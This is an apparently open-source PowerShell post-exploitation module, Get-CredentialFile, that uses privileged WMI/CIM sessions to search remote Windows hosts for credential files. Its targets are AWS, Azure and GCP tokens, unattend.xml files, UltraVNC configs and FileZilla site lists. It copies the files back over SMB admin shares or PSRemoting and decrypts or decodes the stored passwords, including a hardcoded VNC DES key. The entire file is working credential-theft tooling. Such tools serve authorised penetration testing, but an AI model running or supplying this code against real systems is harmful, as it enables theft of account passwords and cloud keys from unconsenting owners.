#requires -version 3

Function Get-CredentialFile {
<#
.SYNOPSIS
    Get credentials from files located on a remote computer.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CredentialFile enumerates files containing credentials on a remote host through WMI and optionally downloads them.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Authentication
    Specifies what authentication method should be used.

.PARAMETER Protocol
    Specifies the protocol to use, defaults to DCOM.

.PARAMETER Download
    Enables file download.

.EXAMPLE
    PS C:\> Get-CredentialFile -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -Download
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
        [String]
        $Authentication = 'Default',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [Switch]
        $Download
    )

    BEGIN {
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            break
        }

        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        try {
            if (-not $PSBoundParameters['ComputerName']) {
                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Download -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            elseif ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Download -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Download -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
        }
        catch [Management.Automation.PSArgumentOutOfRangeException] {
            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
            break
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
                break
            }
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Verbose "[$ComputerName] Access denied."
                break
            }
            else {
                Write-Verbose "[$ComputerName] Failed to establish CIM session."
                break
            }
        }
        catch [Management.Automation.Remoting.PSRemotingTransportException] {
            Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
            break
        }
    }

    PROCESS {

        # Common credential files

        Get-UnattendCredentialFile -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession
        Get-VncCredentialFile -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession

        # User credential files

        $userFiles = @{
            # Cloud credentials
            "AWS-KeyFile"               = "\.aws\credentials"
            "Azure-Tokens"              = "\.azure\accessTokens.json"
            "Azure-Profile"             = "\.azure\azureProfile.json"
            "Azure-TokenCache"          = "\.azure\TokenCache.dat"
            "Azure-TokenCache2"         = "\AppData\Roaming\Windows Azure Powershell\TokenCache.dat"
            "Azure-RMContext"           = "\.azure\AzureRMContext.json"
            "Azure-RMContext2"          = "\AppData\Roaming\Windows Azure Powershell\AzureRMContext.json"
            "GCP-LegacyCreds"           = "\AppData\Roaming\gcloud\legacy_credentials"
            "GCP-CredsDb"               = "\AppData\Roaming\gcloud\credentials.db"
            "GCP-AccessTokensDb"        = "\AppData\Roaming\gcloud\access_tokens.db"
            "Bluemix-Config"            = "\.bluemix\config.json"
            "Bluemix-Config2"           = "\.bluemix\.cf\config.json"
            # Sessions
            "MTPuTTy"                   = "\AppData\Roaming\TTYPlus\mtputty.xml"
            "ApacheDirectoryStudio"     = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
        }

        Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
            $profilePath = $_.LocalPath

            Get-FilezillaCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession

            foreach ($userFile in $userFiles.GetEnumerator()) {
                $filePath = ($_.LocalPath + $userFile.Value) -replace '\\','\\'
                $filter  = "Name='$filePath'"
                $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter $filter -CimSession $cimSession -Verbose:$false
                if ($file.Name) {
                    $result = New-Object -TypeName PSObject
                    $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                    $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value $userFile.Key
                    $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                    $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                    $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
                    Write-Output $result
                    if ($Download) {
                        $outputDir = "$PWD\$ComputerName"
                        $temp = $profilePath -split "\\"
                        $outputFile = "$outputDir\$($temp.get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                        New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                        if ($psSession) {
                            Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $psSession
                        }
                        else {
                            Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                        }
                    }
                }
            }
        }
    }

    END {
        Remove-CimSession -CimSession $cimSession
        if ($psSession) {
            Remove-PSSession -Session $psSession
        }
    }
}

Function Local:Get-UnattendCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # Adapted from PrivescCheck's Get-UnattendSensitiveData by @itm4n
        Function Local:Get-UnattendSensitiveData {
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory=$true)]
                [String]$Path
            )

            Function Local:Get-DecodedPassword {
                [CmdletBinding()]
                Param(
                    [Object]$XmlNode
                )

                if ($XmlNode.GetType().Name -eq "string") {
                    $XmlNode
                }
                else {
                    if ($XmlNode) {
                        if ($XmlNode.PlainText -eq "false") {
                            [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($XmlNode.Value))
                        }
                        else {
                            $XmlNode.Value
                        }
                    }
                }
            }

            [xml] $xml = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError
            if (-not $GetContentError) {
                $xml.GetElementsByTagName("Credentials") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_.Password
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        $result
                    }
                }

                $xml.GetElementsByTagName("LocalAccount") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_.Password
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "LocalAccount"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Name
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        $result
                    }
                }

                $xml.GetElementsByTagName("AutoLogon") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_.Password
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AutoLogon"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        $result
                    }
                }

                $xml.GetElementsByTagName("AdministratorPassword") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AdministratorPassword"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value "N/A"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        $result
                    }
                }
            }
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        $commonFiles = @(
            "C:\Windows\Panther\Unattended.xml"
            "C:\Windows\Panther\Unattend.xml"
            "C:\Windows\Panther\Unattend\Unattended.xml"
            "C:\Windows\Panther\Unattend\Unattend.xml"
            "C:\Windows\System32\Sysprep\Unattend.xml"
            "C:\Windows\System32\Sysprep\Panther\Unattend.xml"
        )

        foreach ($commonFile in $commonFiles) {
            $filePath = ($commonFile) -replace '\\','\\'
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $result = New-Object -TypeName PSObject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'Unattended'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $file.Name -split '\\'
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                    }
                    # Extract credentials from file
                    if ($creds = Get-UnattendSensitiveData -Path $outputFile) {
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                        Write-Output $result
                    }
                }
                else {
                    Write-Output $result
                }
            }
        }
    }

    END {}
}

Function Local:Get-VncCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
            if ($EncryptedPassword.Length -lt 8) {
                return ""
            }
            [byte[]] $seed = (23, 82, 107, 6, 35, 78, 88, 7)
            $key = New-Object byte[] $seed.Length
            for ($i = 0; $i -lt 8; $i++) {
                $key[$i] = (
                    (($seed[$i] -band 0x01) -shl 7) -bor
                    (($seed[$i] -band 0x02) -shl 5) -bor
                    (($seed[$i] -band 0x04) -shl 3) -bor
                    (($seed[$i] -band 0x08) -shl 1) -bor
                    (($seed[$i] -band 0x10) -shr 1) -bor
                    (($seed[$i] -band 0x20) -shr 3) -bor
                    (($seed[$i] -band 0x40) -shr 5) -bor
                    (($seed[$i] -band 0x80) -shr 7)
                )
            }
            $des = New-Object Security.Cryptography.DESCryptoServiceProvider
            $des.Padding = [Security.Cryptography.PaddingMode]::Zeros
            $des.Mode = [Security.Cryptography.CipherMode]::ECB
            return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
        }

        Function Local:HexStringToByteArray ([string] $HexString) {    
            $byteArray = New-Object Byte[] ($HexString.Length/2);
            for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
            }
            return @( ,$byteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        $commonFiles = @(
            "C:\Program Files\UltraVNC\ultravnc.ini"
            "C:\Program Files (x86)\UltraVNC\ultravnc.ini"
            "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"
            "C:\Program Files (x86)\uvnc bvba\UltraVNC\ultravnc.ini"
        )

        foreach ($commonFile in $commonFiles) {
            $filePath = ($commonFile) -replace '\\','\\'
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $result = New-Object -TypeName PSObject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $file.Name -split '\\'
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                    }
                    # Extract credentials from file
                    $creds = New-Object -TypeName PSObject
                    $reader = New-Object IO.StreamReader($outputFile)
                    while (($line = $reader.ReadLine()) -ne $null) {
                        if ($line.Contains("passwd=")) {
                            $pass = ($line.Split('=')[1]).Substring(0, 16)
                            $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($pass)))
                        }
                        if ($line.Contains("passwd2=")) {
                            $pass = ($line.Split('=')[1]).Substring(0, 16)
                            $creds | Add-Member -MemberType NoteProperty -Name 'ViewOnly' -Value (Get-VncDecryptedPassword(HexStringToByteArray($pass)))
                        }
                        if ($line.Contains("PortNumber=") -and -not $line.Contains("HTTP") -and -not $line.Contains("=0")) {
                            $creds | Add-Member -MemberType NoteProperty -Name 'Port' -Value ($line.Split('=')[1])
                        }
                    }
                    $reader.Close()
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                }
                Write-Output $result
            }
        }
    }

    END {}
}

Function Local:Get-FilezillaCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [string]
        $ProfilePath,

        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        $userFiles = @(
            "\AppData\Roaming\FileZilla\sitemanager.xml"
            "\AppData\Roaming\FileZilla\recentservers.xml"
        )

        foreach ($userFile in $userFiles) {
            $filePath = ($ProfilePath + $userFile) -replace '\\','\\'
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $result = New-Object -TypeName PSObject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'FileZilla'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $ProfilePath -split "\\"
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                    }
                    # Extract credentials from file
                    $creds = New-Object Collections.ArrayList
                    $xml = [Xml] (Get-Content $outputFile)
                    if (-not ($sessions = $xml.SelectNodes('//FileZilla3/Servers/Server')).Count) {
                        $sessions = $xml.SelectNodes('//FileZilla3/RecentServers/Server')
                    }
                    foreach($session in $sessions) {
                        $cred = @{}
                        $session.ChildNodes | ForEach-Object {
                            if ($_.InnerText) {
                                if ($_.Name -eq "Pass") {
                                    if ($_.Attributes["encoding"].Value -eq "base64") {
                                        $cred["Password"] = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($_.InnerText))
                                    }
                                    else {
                                        $cred["Password"] = $_.InnerText
                                    }
                                }
                                else {
                                    $cred[$_.Name] = $_.InnerText
                                }
                            }
                        }
                        if ($cred.Password) {
                            $creds.Add((New-Object PSObject -Property $cred | Select-Object -Property Host,Port,User,Password)) | Out-Null
                        }
                    }
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                }
                Write-Output $result
            }
        }
    }

    END {}
}

Function Local:Get-RemoteFile {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $Path,

        [Parameter(Mandatory = $True)]
        [String]
        $Destination,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateSet('SMB', 'PSRemoting')]
        [String]
        $Protocol = 'SMB',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.Automation.Runspaces.PSSession]
        $PSSession
    )

    BEGIN {
        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
            $stringBuilder = New-Object System.Text.StringBuilder 
            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
                [Void]$stringBuilder.Append($_.ToString("x2")) 
            } 
            return $stringBuilder.ToString() 
        }
    }

    PROCESS {
        if ($PSSession) {
            # Download file via PSRemoting
            Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
        }
        else {
            # Download file via SMB
            $fileDrive = ($Path -split ':').Get(0)
            $filePath = ($Path -split ':').Get(1)
            if ($Credential.Username) {
                $drive = Get-StringHash $ComputerName
                New-PSDrive -Name $drive -Root "\\$ComputerName\$fileDrive`$" -PSProvider "FileSystem" -Credential $Credential | Out-Null
                Copy-Item -Path "${drive}:$filePath" -Destination $Destination -Recurse
                Remove-PSDrive $drive
            }
            else {
                Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
            }
        }
    }

    END {}
}